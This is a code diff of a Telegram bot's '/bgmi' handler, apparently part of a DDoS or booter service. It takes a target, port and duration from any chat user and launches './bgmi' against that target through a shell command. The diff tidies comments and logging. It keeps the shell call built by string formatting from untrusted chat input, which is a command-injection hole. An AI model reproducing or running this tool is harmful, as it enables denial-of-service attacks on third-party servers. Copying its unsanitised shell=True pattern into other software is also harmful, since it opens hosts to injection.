@@ -285,29 +285,35 @@ COOLDOWN_TIME =0
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
-    # Remove the check for allowed_user_ids
-    # user_id = str(message.chat.id)
+    # User ID retrieval
+    user_id = str(message.chat.id)
     
+    # Split the command text
     command = message.text.split()
+    
+    # Check if the command has exactly 4 parts
     if len(command) == 4:
         target = command[1]
         port = int(command[2])
         time = int(command[3])
-        
-        # No restriction on time
-        user_id = str(message.chat.id)  # Get user ID
+
+        # Log the command details
         record_command_logs(user_id, '/bgmi', target, port, time)
         log_command(user_id, target, port, time)
         start_attack_reply(message, target, port, time)
         
+        # Construct and run the command
         full_command = f"./bgmi {target} {port} {time} 110"
         process = subprocess.run(full_command, shell=True)
         
+        # Prepare the response
         response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
     else:
-        response = "✅ Usage :- /bgmi <target> <port> <time>"
+        response = "✅ Usage: /bgmi <target> <port> <time>"
     
+    # Send the response back to the user
     bot.reply_to(message, response)
+
 
 
 
